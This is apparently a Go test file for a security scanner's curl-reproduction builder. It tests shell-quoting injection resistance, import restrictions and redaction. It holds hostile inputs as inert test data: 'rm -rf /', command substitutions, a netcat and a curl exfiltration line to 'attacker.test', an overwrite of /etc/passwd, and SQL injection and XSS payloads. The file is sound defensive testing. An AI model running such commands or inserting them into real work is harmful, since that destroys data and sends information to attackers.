package main

import (
	"encoding/json"
	"go/parser"
	"go/token"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"sakanner/internal/detection"
	"sakanner/pkg/models"
)

// TestSourceNeverImportsExecutionCapableAPIs is a static,
// belt-and-suspenders proof -- mirroring
// internal/detectors/traversalactive/filesystem_safety_test.go's own
// established pattern -- that reproduction.go (the ONE file that
// builds a "curl-like" command an operator might paste and run
// themselves) never imports net/http, os/exec, or any other API that
// could make sakanner ITSELF issue the reproduced request or execute
// a shell command. Checked via go/parser against the actual parsed
// import declarations, never a naive substring search.
func TestSourceNeverImportsExecutionCapableAPIs(t *testing.T) {
	forbiddenImports := map[string]bool{
		"net/http": true, "os/exec": true, "net": true, "syscall": true,
	}
	fset := token.NewFileSet()
	for _, name := range []string{"reproduction.go"} {
		path := filepath.Join(".", name)
		if _, err := os.Stat(path); err != nil {
			t.Fatalf("expected %s to exist: %v", name, err)
		}
		file, err := parser.ParseFile(fset, path, nil, parser.ImportsOnly)
		if err != nil {
			t.Fatalf("ParseFile(%s): %v", name, err)
		}
		for _, imp := range file.Imports {
			importPath := strings.Trim(imp.Path.Value, `"`)
			if forbiddenImports[importPath] {
				t.Errorf("SECURITY: %s imports %q -- the reproduction-building code must never be able to issue a network request or execute a local command itself, only ever construct a string for the operator to run manually", name, importPath)
			}
		}
	}
}

// --- shellQuote: shell-injection resistance -------------------------------

func TestShellQuote_EmbeddedSingleQuote(t *testing.T) {
	in := `it's a test`
	out := shellQuote(in)
	// Must be a single POSIX-shell argument that, when interpreted by
	// a real shell, evaluates back to the EXACT original string.
	assertShellRoundTrip(t, out, in)
}

func TestShellQuote_ShellMetacharacters_NeverBreakOut(t *testing.T) {
	dangerous := []string{
		`; rm -rf /`,
		`$(whoami)`,
		"`whoami`",
		`| nc attacker.test 4444`,
		`&& curl http://attacker.test/exfil`,
		`> /etc/passwd`,
		`$PATH`,
		"a\nb",
		`"nested double quotes"`,
	}
	for _, in := range dangerous {
		out := shellQuote(in)
		assertShellRoundTrip(t, out, in)
	}
}

func TestShellQuote_ResultAlwaysSingleQuoted(t *testing.T) {
	for _, in := range []string{"", "plain", "a'b", "a'b'c"} {
		out := shellQuote(in)
		if !strings.HasPrefix(out, "'") || !strings.HasSuffix(out, "'") {
			t.Errorf("shellQuote(%q) = %q, want a string starting and ending with '", in, out)
		}
	}
}

// assertShellRoundTrip uses the REAL shell (if available in the test
// environment) to prove quoted decodes back to in exactly -- the
// strongest possible proof that shellQuote is actually injection-safe,
// not merely "looks right."
func assertShellRoundTrip(t *testing.T, quoted, want string) {
	t.Helper()
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("no /bin/sh available in this test environment")
	}
	out, err := exec.Command("sh", "-c", "printf '%s' "+quoted).Output()
	if err != nil {
		t.Fatalf("sh -c failed for quoted=%q: %v", quoted, err)
	}
	if string(out) != want {
		t.Errorf("SECURITY: shell round-trip mismatch -- quoted=%q decoded to %q, want %q", quoted, string(out), want)
	}
}

// --- buildCurlReproduction ------------------------------------------------

func evidenceItem(t *testing.T, kind models.EvidenceKind, item detection.RequestResponseEvidence) models.Evidence {
	t.Helper()
	b, err := json.Marshal(item)
	if err != nil {
		t.Fatalf("marshal evidence: %v", err)
	}
	return models.Evidence{Kind: kind, Content: string(b)}
}

func TestBuildCurlReproduction_GETQuery(t *testing.T) {
	f := models.Finding{
		Evidence: []models.Evidence{
			evidenceItem(t, models.EvidenceKindRequestResponse, detection.RequestResponseEvidence{
				Request:   "GET http://target.test/search?q=%27+OR+%271%27%3D%271",
				Parameter: "q", Payload: "' OR '1'='1",
			}),
		},
	}
	cmd, notes := buildCurlReproduction(f)
	if !strings.Contains(cmd, "curl") || !strings.Contains(cmd, "-X 'GET'") {
		t.Errorf("expected a GET curl command, got: %q", cmd)
	}
	if !strings.Contains(cmd, "target.test") {
		t.Errorf("expected the target URL in the command, got: %q", cmd)
	}
	if len(notes) == 0 {
		t.Error("expected at least the standard 'information only' note")
	}
}

func TestBuildCurlReproduction_POSTForm_IncludesBody(t *testing.T) {
	f := models.Finding{
		Evidence: []models.Evidence{
			evidenceItem(t, models.EvidenceKindRequestResponse, detection.RequestResponseEvidence{
				Request: "POST http://target.test/comment", Parameter: "comment", Payload: "<script>x</script>",
			}),
		},
	}
	cmd, _ := buildCurlReproduction(f)
	if !strings.Contains(cmd, "-X 'POST'") {
		t.Errorf("expected a POST curl command, got: %q", cmd)
	}
	if !strings.Contains(cmd, "-d") {
		t.Errorf("expected a -d body argument for a POST finding, got: %q", cmd)
	}
}

func TestBuildCurlReproduction_NoEvidence_ReturnsExplanatoryNote(t *testing.T) {
	f := models.Finding{}
	cmd, notes := buildCurlReproduction(f)
	if cmd != "" {
		t.Errorf("expected an empty command when there is no evidence, got: %q", cmd)
	}
	if len(notes) == 0 || !strings.Contains(notes[0], "no request/response evidence") {
		t.Errorf("expected an explanatory note, got: %v", notes)
	}
}

func TestBuildCurlReproduction_MalformedEvidenceJSON_NeverPanics(t *testing.T) {
	f := models.Finding{
		Evidence: []models.Evidence{
			{Kind: models.EvidenceKindRequestResponse, Content: "not valid json{{{"},
		},
	}
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("buildCurlReproduction panicked on malformed evidence JSON: %v", r)
		}
	}()
	cmd, notes := buildCurlReproduction(f)
	if cmd != "" {
		t.Errorf("expected an empty command for unparseable evidence, got: %q", cmd)
	}
	if len(notes) == 0 {
		t.Error("expected an explanatory note for unparseable evidence")
	}
}

func TestBuildCurlReproduction_MalformedRequestLine_NeverPanics(t *testing.T) {
	f := models.Finding{
		Evidence: []models.Evidence{
			evidenceItem(t, models.EvidenceKindRequestResponse, detection.RequestResponseEvidence{Request: "not-a-valid-request-line"}),
		},
	}
	cmd, notes := buildCurlReproduction(f)
	if cmd != "" {
		t.Errorf("expected an empty command for a malformed request line, got: %q", cmd)
	}
	if len(notes) == 0 {
		t.Error("expected an explanatory note")
	}
}

func TestBuildCurlReproduction_PrefersLastConfirmingEvidenceOverBaseline(t *testing.T) {
	f := models.Finding{
		Evidence: []models.Evidence{
			evidenceItem(t, models.EvidenceKindBaseline, detection.RequestResponseEvidence{Request: "GET http://target.test/baseline"}),
			evidenceItem(t, models.EvidenceKindRequestResponse, detection.RequestResponseEvidence{Request: "GET http://target.test/confirmed?x=1", Parameter: "x", Payload: "1"}),
		},
	}
	cmd, _ := buildCurlReproduction(f)
	if !strings.Contains(cmd, "confirmed") {
		t.Errorf("expected the CONFIRMING evidence's own URL, not the baseline's, got: %q", cmd)
	}
}

// TestBuildCurlReproduction_SensitiveValueAlreadyRedacted proves this
// function never UN-does redaction that already happened at
// evidence-creation time -- it only ever prints what's already
// stored.
func TestBuildCurlReproduction_SensitiveValueAlreadyRedacted(t *testing.T) {
	f := models.Finding{
		Evidence: []models.Evidence{
			evidenceItem(t, models.EvidenceKindRequestResponse, detection.RequestResponseEvidence{
				Request: "POST http://target.test/login", Parameter: "password", Payload: "<REDACTED>",
			}),
		},
	}
	cmd, _ := buildCurlReproduction(f)
	if strings.Contains(strings.ToLower(cmd), "hunter2") {
		t.Error("SECURITY: a raw credential value leaked into the reproduction command")
	}
	if !strings.Contains(cmd, "<REDACTED>") {
		t.Errorf("expected the already-redacted placeholder to be preserved verbatim, got: %q", cmd)
	}
}

// TestBuildCurlReproduction_MaliciousValue_ShellSafe proves an
// attacker-controlled evidence value (however it reached storage)
// can never break out of its own quoted argument in the generated
// command -- by extracting the exact quoted body-argument
// buildCurlReproduction produced and round-tripping THAT through a
// real shell (the same safe technique assertShellRoundTrip already
// uses for shellQuote in isolation), rather than executing the
// dangerous-looking text as a command itself (which would be an
// unsafe way to write this test regardless of whether the code under
// test has a bug).
func TestBuildCurlReproduction_MaliciousValue_ShellSafe(t *testing.T) {
	malicious := `'; rm -rf / #`
	f := models.Finding{
		Evidence: []models.Evidence{
			evidenceItem(t, models.EvidenceKindRequestResponse, detection.RequestResponseEvidence{
				Request: "POST http://target.test/x", Parameter: "field", Payload: malicious,
			}),
		},
	}
	cmd, _ := buildCurlReproduction(f)
	if !strings.Contains(cmd, "-d") {
		t.Fatalf("expected a -d body argument, got: %q", cmd)
	}
	// Extract the -d argument's own quoted value and prove it decodes
	// back to EXACTLY "field=<malicious>" as inert data.
	idx := strings.Index(cmd, "-d ")
	if idx < 0 {
		t.Fatalf("could not locate -d in: %q", cmd)
	}
	quotedArg := strings.TrimSpace(cmd[idx+len("-d "):])
	assertShellRoundTrip(t, quotedArg, "field="+malicious)
}
